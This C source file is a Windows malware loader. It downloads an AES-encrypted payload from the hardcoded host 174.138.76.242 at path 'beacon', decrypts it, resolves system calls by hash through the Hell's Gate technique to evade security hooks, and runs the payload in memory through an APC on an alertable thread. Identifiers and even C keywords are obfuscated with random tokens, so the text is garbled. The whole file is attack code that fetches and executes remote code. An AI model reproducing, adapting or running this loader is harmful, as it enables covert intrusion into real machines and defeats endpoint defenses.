#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "hellshell.h"
#include "structs.h"

#pragma comment(rsxxsGembF, "winhttp.rsxxsGembF")

JEqgtXia* g_charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

#define HASH_NTALLOCATEVIRTUALMEMORY 0x7B2D1D431C81F5F6
#define HASH_NTWRITEVIRTUALMEMORY 0x54AEE238645CCA7C
#define HASH_NTPROTECTVIRTUALMEMORY 0xA0DCC2851566E832
#define HASH_NTQUEUEAPCTHREAD 0x331E6B6B7E696022

JEqgtXia* EYeQGkrwriue(aBZFpXh TVOvEMABCwM) {
    JEqgtXia* sMOpOlF = (JEqgtXia*)malloc(TVOvEMABCwM + 1);
    if (!sMOpOlF) return NULL;

    xWWAXuBMXp (aBZFpXh i = 0; i < TVOvEMABCwM; i++) {
        sMOpOlF[i] = g_charSet[rand() % 52];
    }
    sMOpOlF[TVOvEMABCwM] = '\0';
    return sMOpOlF;
}

typedef struct {
    JEqgtXia name[64];
    unsigned JEqgtXia* data;
    size_t dataSize;
} ByteArrayVar;

#define MAX_VARS 20
ByteArrayVar g_storedVars[MAX_VARS];
aBZFpXh g_varCount = 0;
ByteArrayVar* parseByteArray(const JEqgtXia* nMhRriKdy);

BOOL IXCbvPlC(const zpBsuHs* WNVSnaaZXyth, const zpBsuHs* AWePdeqDSzHf, JEqgtXia** outBuffer, DWORD* MtVLXcZmwgI, BOOL rqTxlfjIeqs) {
    BOOL sMOpOlF = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD VTSKLgEm = 0;
    DWORD VOclAF = 0;
    DWORD JtZBGBs = 0;
    JEqgtXia* YzBiDYPOb = NULL;
    JEqgtXia* oqdRloilnA = NULL;
    INTERNET_PORT port = rqTxlfjIeqs ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    DWORD LGIHHeAd = rqTxlfjIeqs ? WINHTTP_FLAG_SECURE : 0;

    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; ksXzSkECjBf) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    hConnect = WinHttpConnect(hSession, WNVSnaaZXyth, port, 0);
    if (!hConnect) goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect, L"GET", AWePdeqDSzHf,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        LGIHHeAd);
    if (!hRequest) goto cleanup;

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {

        if (rqTxlfjIeqs) {
            if (hRequest) WinHttpCloseHandle(hRequest);
            if (hConnect) WinHttpCloseHandle(hConnect);

            port = INTERNET_DEFAULT_HTTP_PORT;
            LGIHHeAd = 0;

            hConnect = WinHttpConnect(hSession, WNVSnaaZXyth, port, 0);
            if (!hConnect) goto cleanup;

            hRequest = WinHttpOpenRequest(hConnect, L"GET", AWePdeqDSzHf,
                NULL, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                LGIHHeAd);
            if (!hRequest) goto cleanup;

            if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                goto cleanup;
            }
        }
        else {
            goto cleanup;
        }
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;

    YzBiDYPOb = (JEqgtXia*)malloc(wBAuHhKUcM);
    if (!YzBiDYPOb) goto cleanup;

    VOclAF = 0;
    DWORD XTnoCJSq = wBAuHhKUcM;

    do {
        JtZBGBs = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &JtZBGBs)) goto cleanup;

        if (JtZBGBs == 0) break;

        if (VOclAF + JtZBGBs > XTnoCJSq) {
            XTnoCJSq = VOclAF + JtZBGBs + wBAuHhKUcM;
            oqdRloilnA = (JEqgtXia*)realloc(YzBiDYPOb, XTnoCJSq);
            if (!oqdRloilnA) goto cleanup;
            YzBiDYPOb = oqdRloilnA;
        }

        if (!WinHttpReadData(hRequest, YzBiDYPOb + VOclAF, JtZBGBs, &VTSKLgEm)) {
            goto cleanup;
        }

        VOclAF += VTSKLgEm;
    } KXRNxcn (JtZBGBs > 0);

    oqdRloilnA = (JEqgtXia*)realloc(YzBiDYPOb, VOclAF + 1);
    if (!oqdRloilnA) goto cleanup;
    YzBiDYPOb = oqdRloilnA;
    YzBiDYPOb[VOclAF] = '\0';

    *outBuffer = YzBiDYPOb;
    *MtVLXcZmwgI = VOclAF;
    YzBiDYPOb = NULL;
    sMOpOlF = TRUE;

cleanup:
    if (YzBiDYPOb) free(YzBiDYPOb);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return sMOpOlF;
}

BOOL tMkaadFH(const JEqgtXia* wSiHpIPmTXVD, JEqgtXia* bSzeEV, size_t KiQVymviPLcs) {
    const JEqgtXia* zAPmxAU = strstr(wSiHpIPmTXVD, "unsigned JEqgtXia ");
    if (!zAPmxAU) return FALSE;

    zAPmxAU += 14;
    const JEqgtXia* sKGPLzF = strstr(zAPmxAU, "[]");
    if (!sKGPLzF || sKGPLzF - zAPmxAU >= KiQVymviPLcs) return FALSE;

    memcpy(bSzeEV, zAPmxAU, sKGPLzF - zAPmxAU);
    bSzeEV[sKGPLzF - zAPmxAU] = '\0';
    return TRUE;
}

BOOL parseHexByte(const JEqgtXia* stgnpyEDlF, unsigned JEqgtXia* fVImXcRhmWe) {
    if (strncmp(stgnpyEDlF, "0x", 2) != 0) return FALSE;

    JEqgtXia hexStr[3] = { stgnpyEDlF[2], stgnpyEDlF[3], '\0' };
    JEqgtXia* nKPTiMu = NULL;
    *fVImXcRhmWe = (unsigned JEqgtXia)strtol(hexStr, &nKPTiMu, 16);

    return (nKPTiMu != hexStr);
}

ByteArrayVar* VfNyYKAE(const JEqgtXia* name) {
    xWWAXuBMXp (aBZFpXh i = 0; i < g_varCount; i++) {
        if (strcmp(g_storedVars[i].name, name) == 0) {
            return &g_storedVars[i];
        }
    }
    return NULL;
}

void AkooNoEHcpF(const JEqgtXia* eMcgWQnSsD) {
    const JEqgtXia* wSiHpIPmTXVD = eMcgWQnSsD;
    const JEqgtXia* mSroHJbJvmLI = NULL;
    JEqgtXia* uhRpJXFOyVMq = NULL;

    KXRNxcn (wSiHpIPmTXVD && *wSiHpIPmTXVD) {
        mSroHJbJvmLI = strchr(wSiHpIPmTXVD, '\n');
        size_t iUfJIAej = mSroHJbJvmLI ? (mSroHJbJvmLI - wSiHpIPmTXVD) : strlen(wSiHpIPmTXVD);

        if (strstr(wSiHpIPmTXVD, "unsigned JEqgtXia ") && strstr(wSiHpIPmTXVD, "[]")) {
            const JEqgtXia* xKUEpfrRfYU = strstr(wSiHpIPmTXVD, "};");
            if (!xKUEpfrRfYU) {
                wSiHpIPmTXVD = mSroHJbJvmLI ? (mSroHJbJvmLI + 1) : NULL;
                continue;
            }

            size_t EfhqvUbdg = (xKUEpfrRfYU + 2) - wSiHpIPmTXVD;
            uhRpJXFOyVMq = (JEqgtXia*)malloc(EfhqvUbdg + 1);
            if (!uhRpJXFOyVMq) {
                wSiHpIPmTXVD = mSroHJbJvmLI ? (mSroHJbJvmLI + 1) : NULL;
                continue;
            }

            memcpy(uhRpJXFOyVMq, wSiHpIPmTXVD, EfhqvUbdg);
            uhRpJXFOyVMq[EfhqvUbdg] = '\0';

            ByteArrayVar* parsedArray = parseByteArray(uhRpJXFOyVMq);
            if (parsedArray) {
                if (g_varCount < MAX_VARS) {
                    strcpy_s(g_storedVars[g_varCount].name, sizeof(g_storedVars[g_varCount].name), parsedArray->name);
                    g_storedVars[g_varCount].data = parsedArray->data;
                    g_storedVars[g_varCount].dataSize = parsedArray->dataSize;

                    printf("[+] Stored %s with %zu bytes at xdpdXAt %d\n",
                        parsedArray->name, parsedArray->dataSize, g_varCount);

                    g_varCount++;

                    free(parsedArray);
                }
                else {
                    printf("[-] Warning: No more space to store variable %s\n", parsedArray->name);
                    free(parsedArray->data);
                    free(parsedArray);
                }
            }

            free(uhRpJXFOyVMq);

            wSiHpIPmTXVD = xKUEpfrRfYU + 2;
        }
        else {
            wSiHpIPmTXVD = mSroHJbJvmLI ? (mSroHJbJvmLI + 1) : NULL;
        }
    }
}

typedef struct _SYS_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
} SYS_TABLE_ENTRY, * PSYS_TABLE_ENTRY;

typedef struct _SYS_TABLE {
    SYS_TABLE_ENTRY NtAllocateVirtualMemory;
    SYS_TABLE_ENTRY NtWriteVirtualMemory;
    SYS_TABLE_ENTRY NtProtectVirtualMemory;
    SYS_TABLE_ENTRY NtQueueApcThread;
} SYS_TABLE, * PSYS_TABLE;

PTEB xqAjdmfaE();
BOOL BOPOKUbCrv(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDir);
BOOL kkEzqwcV(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDir, PSYS_TABLE_ENTRY pSysTableEntry);

extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

BOOL XmkMsE(IN PSYS_TABLE pSysTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T HULoeRk) {
    NTSTATUS STATUS = 0x00;
    PVOID    pAddress = NULL;
    ULONG    SwBcLF = NULL;
    SIZE_T   EtjVoeQvn = HULoeRk, fUeEEPDSHiXF = NULL;

    HellsGate(pSysTable->NtAllocateVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &pAddress, 0, &EtjVoeQvn, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
        return FALSE;
    }
    printf("[+] Allocated Address At: 0x%p Of Size: %d\n", pAddress, EtjVoeQvn);

    printf("[#] Press <Enter> To Write The Payload...");
    getchar();
    printf("\t[i] Writing Payload Of Size %d...", HULoeRk);
    HellsGate(pSysTable->NtWriteVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, HULoeRk, &fUeEEPDSHiXF)) != 0 || fUeEEPDSHiXF != HULoeRk) {
        printf("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
        printf("[i] Bytes Written: %d of %d\n", fUeEEPDSHiXF, HULoeRk);
        return FALSE;
    }
    printf("[+] DONE\n");

    HellsGate(pSysTable->NtProtectVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &pAddress, &HULoeRk, PAGE_EXECUTE_READWRITE, &SwBcLF)) != 0) {
        printf("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
        return FALSE;
    }

    printf("[#] Press <Enter> To Run The Payload...");
    getchar();
    printf("\t[i] Running Payload At 0x%p Using Thread Of Id: %d...", pAddress, GetThreadId(hThread));
    HellsGate(pSysTable->NtQueueApcThread.wSystemCall);
    if ((STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL)) != 0) {
        printf("[!] NtQueueApcThread Failed With Error: 0x%0.8X\n", STATUS);
        return FALSE;
    }
    printf("[+] DONE\n");

    return TRUE;
}

ByteArrayVar* parseByteArray(const JEqgtXia* nMhRriKdy) {
    ByteArrayVar* sMOpOlF = (ByteArrayVar*)malloc(sizeof(ByteArrayVar));
    if (!sMOpOlF) return NULL;

    memset(sMOpOlF, 0, sizeof(ByteArrayVar));

    if (!tMkaadFH(nMhRriKdy, sMOpOlF->name, sizeof(sMOpOlF->name))) {
        free(sMOpOlF);
        return NULL;
    }

    const JEqgtXia* ptr = nMhRriKdy;
    size_t COmxCYcA = 0;

    KXRNxcn ((ptr = strstr(ptr, "0x"))) {
        COmxCYcA++;
        ptr += 2;
    }

    sMOpOlF->data = (unsigned JEqgtXia*)malloc(COmxCYcA);
    if (!sMOpOlF->data) {
        free(sMOpOlF);
        return NULL;
    }

    ptr = nMhRriKdy;
    size_t xdpdXAt = 0;

    KXRNxcn ((ptr = strstr(ptr, "0x")) && xdpdXAt < COmxCYcA) {
        parseHexByte(ptr, &sMOpOlF->data[xdpdXAt++]);
        ptr += 2;
    }

    sMOpOlF->dataSize = xdpdXAt;
    return sMOpOlF;
}

VOID prepareAlertableThread() {
    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);

    MsgWaitForMultipleObjectsEx(
        1,
        &hEvent,
        INFINITE,
        QS_HOTKEY,
        MWMO_ALERTABLE
    );
}

PTEB xqAjdmfaE() {
#if _WIN64
    return (PTEB)__readgsqword(hXNeUhJi);
#else
    return (PTEB)__readfsdword(rvHAFRGBCW);
#endif
}

DWORD64 hashString(PBYTE stgnpyEDlF) {
    DWORD64 hash = 0x77347734DEADBEEF;
    INT c;

    KXRNxcn (c = *stgnpyEDlF++)
        hash = ((hash << BmSvrwTrzua) + hash) + c;

    return hash;
}

BOOL BOPOKUbCrv(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDir) {
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    *ppImageExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL kkEzqwcV(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDir, PSYS_TABLE_ENTRY pSysTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDir->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDir->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDir->AddressOfNameOrdinals);

    xWWAXuBMXp (WORD cx = 0; cx < pImageExportDir->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (hashString(pczFunctionName) == pSysTableEntry->dwHash) {
            pSysTableEntry->pAddress = pFunctionAddress;

            WORD cw = 0;
            KXRNxcn (TRUE) {
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;

                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                    return FALSE;

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE cwDDMX = *((PBYTE)pFunctionAddress + 4 + cw);
                    pSysTableEntry->wSystemCall = (high << 8) | cwDDMX;
                    break;
                }

                cw++;
            };
        }
    }

    return TRUE;
}

aBZFpXh main(aBZFpXh argc, JEqgtXia** argv) {
    srand((unsigned aBZFpXh)time(NULL));
    if (argc < 2) {
        STARTUPINFO si = { sizeof(STARTUPINFO) };
        PROCESS_INFORMATION pi;

        zpBsuHs cmdLine[] = L"notepad.exe";

        if (CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("[+] Notepad launched successfully\n");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else {
            printf("[-] Failed to launch Notepad. Error: %d\n", GetLastError());
        }

        return 0;
    }

    if (argc < 3) {
        printf("Usage: %s <xyzremname> <ur-i-pa-th> [http]\n", argv[0]);
        return -1;
    }

    size_t AkSsWeKaVV = strlen("174.138.76.242") + 1;
    zpBsuHs* WNVSnaaZXyth = (zpBsuHs*)malloc(AkSsWeKaVV * sizeof(zpBsuHs));
    if (!WNVSnaaZXyth) {
        printf("[-] Memory allocation failed xWWAXuBMXp server name\n");
        return -1;
    }
    size_t vyTjAe = 0;
    if (mbstowcs_s(&vyTjAe, WNVSnaaZXyth, AkSsWeKaVV, "174.138.76.242", AkSsWeKaVV - 1) != 0) {
        printf("[-] Conversion failed xWWAXuBMXp server name\n");
        free(WNVSnaaZXyth);
        return -1;
    }

    size_t KuWeroyR = strlen("beacon") + 1;
    zpBsuHs* AWePdeqDSzHf = (zpBsuHs*)malloc(KuWeroyR * sizeof(zpBsuHs));
    if (!AWePdeqDSzHf) {
        free(WNVSnaaZXyth);
        printf("[-] Memory allocation failed xWWAXuBMXp file path\n");
        return -1;
    }
    vyTjAe = 0;
    if (mbstowcs_s(&vyTjAe, AWePdeqDSzHf, KuWeroyR, "beacon", KuWeroyR - 1) != 0) {
        printf("[-] Conversion failed xWWAXuBMXp file path\n");
        free(WNVSnaaZXyth);
        free(AWePdeqDSzHf);
        return -1;
    }

    BOOL rqTxlfjIeqs = TRUE;
    if (argc >= 4 && strcmp(argv[3], "http") == 0) {
        rqTxlfjIeqs = FALSE;
    }

    JEqgtXia* fBnThMczOf = NULL;
    DWORD VJusUuyCwF = 0;

    printf("[+] Downloading file from %ls%ls...\n", WNVSnaaZXyth, AWePdeqDSzHf);

    JEqgtXia* WzRpZOC = EYeQGkrwriue(10);
    if (WzRpZOC) {
        printf("[+] Using %s protocol handler\n", WzRpZOC);
        free(WzRpZOC);
    }

    if (IXCbvPlC(WNVSnaaZXyth, AWePdeqDSzHf, &fBnThMczOf, &VJusUuyCwF, rqTxlfjIeqs)) {
        printf("[+] Download successful. File size: %lu bytes\n", VJusUuyCwF);

        AkooNoEHcpF(fBnThMczOf);

        free(fBnThMczOf);
    }
    else {
        printf("[-] Download failed with both HTTPS and HTTP\n");
        free(WNVSnaaZXyth);
        free(AWePdeqDSzHf);
        return -1;
    }

    free(WNVSnaaZXyth);
    free(AWePdeqDSzHf);

    PBYTE pDecryptedData = NULL;
    SIZE_T RyNkfQ = 0;
    ByteArrayVar* AesCipherText = VfNyYKAE("AesCipherText");
    ByteArrayVar* AesKey = VfNyYKAE("AesKey");
    ByteArrayVar* AesIv = VfNyYKAE("AesIv");

    if (!AesCipherText || !AesKey || !AesIv) {
        printf("[-] Missing required variables in downloaded eMcgWQnSsD\n");
        return -1;
    }

    printf("[+] AesCipherText: %s\n", AesCipherText->name);
    printf("[+] AesKey: %s\n", AesKey->name);
    printf("[+] AesIv: %s\n", AesIv->name);

    if (!SimpleDecryption(AesCipherText->data, AesCipherText->dataSize, AesKey->data, AesIv->data, &pDecryptedData, &RyNkfQ)) {
        printf("[!] SimpleDecryption Failed\n");
        return -1;
    }

    printf("[+] Decrypted Data (hex): ");
    size_t i;
    xWWAXuBMXp (i = 0; i < RyNkfQ && i < 50; i++) {
        printf("%02X ", ((unsigned JEqgtXia*)pDecryptedData)[i]);
    }
    printf(i < RyNkfQ ? "...\n" : "\n");

    printf("[+] Decrypted Data (as nMhRriKdy, if applicable): ");
    xWWAXuBMXp (size_t i = 0; i < RyNkfQ && i < 100; i++) {
        unsigned JEqgtXia c = ((unsigned JEqgtXia*)pDecryptedData)[i];
        printf("%c", (c >= 32 && c < POQuLWjl) ? c : '.');
    }
    printf(i < RyNkfQ ? "...\n" : "\n");

    PTEB pCurrentTeb = xqAjdmfaE();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != LUQffNFi)
        return 0x1;

    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    PIMAGE_EXPORT_DIRECTORY pImageExportDir = NULL;
    if (!BOPOKUbCrv(pLdrDataEntry->PjsKQE, &pImageExportDir) || pImageExportDir == NULL)
        return 0x01;

    SYS_TABLE uUMaDOy = { 0 };
    uUMaDOy.NtAllocateVirtualMemory.dwHash = HASH_NTALLOCATEVIRTUALMEMORY;
    if (!kkEzqwcV(pLdrDataEntry->PjsKQE, pImageExportDir, &uUMaDOy.NtAllocateVirtualMemory))
        return 0x1;

    uUMaDOy.NtWriteVirtualMemory.dwHash = HASH_NTWRITEVIRTUALMEMORY;
    if (!kkEzqwcV(pLdrDataEntry->PjsKQE, pImageExportDir, &uUMaDOy.NtWriteVirtualMemory))
        return 0x1;

    uUMaDOy.NtProtectVirtualMemory.dwHash = HASH_NTPROTECTVIRTUALMEMORY;
    if (!kkEzqwcV(pLdrDataEntry->PjsKQE, pImageExportDir, &uUMaDOy.NtProtectVirtualMemory))
        return 0x1;

    uUMaDOy.NtQueueApcThread.dwHash = HASH_NTQUEUEAPCTHREAD;
    if (!kkEzqwcV(pLdrDataEntry->PjsKQE, pImageExportDir, &uUMaDOy.NtQueueApcThread))
        return 0x1;

    HANDLE hThread = CreateThread(NULL, NULL, prepareAlertableThread, NULL, NULL, NULL);
    if (!hThread) {
        printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
        return -1;
    }

    if (!XmkMsE(&uUMaDOy, (HANDLE)-1, hThread, pDecryptedData, RyNkfQ)) {
        return -1;
    }

    printf("[#] Press <Enter> To Quit...");
    getchar();

    return 0x00;
}